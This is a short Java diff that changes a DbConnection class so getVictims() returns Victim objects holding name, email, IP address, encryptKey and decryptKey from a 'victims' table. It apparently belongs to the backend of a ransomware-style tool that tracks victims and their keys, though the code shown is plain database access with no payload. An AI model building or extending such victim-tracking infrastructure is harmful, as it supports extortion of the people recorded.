@@ -1,6 +1,7 @@
 package backend;
 
 import java.sql.*;
+import java.util.ArrayList;
 
 public class DbConnection {
 
@@ -14,19 +15,29 @@ public class DbConnection {
         }
     }
 
-    public void getVictims () {
+    public ArrayList<Victim> getVictims () {
+        ArrayList<Victim> victims = new ArrayList<Victim>();
         try {
             Statement statement = connection.createStatement();
             ResultSet resultSet = statement.executeQuery("SELECT * FROM victims");
 
             while(resultSet.next()) {
-                System.out.println(resultSet.getString("name"));
+                int id = resultSet.getInt("id");
+                String name = resultSet.getString("name");
+                String email = resultSet.getString("email");
+                String ip = resultSet.getString("ip");
+                String encryptKey = resultSet.getString("encryptKey");
+                String decryptKey = resultSet.getString("decryptKey");
+
+                Victim victim = new Victim(id, name, email, ip, encryptKey, decryptKey);
+                victims.add(victim);
             }
 
         } catch (SQLException e) {
             e.printStackTrace();
         }
 
+        return victims;
     }
 
     public boolean saveVictim (Victim victim) {
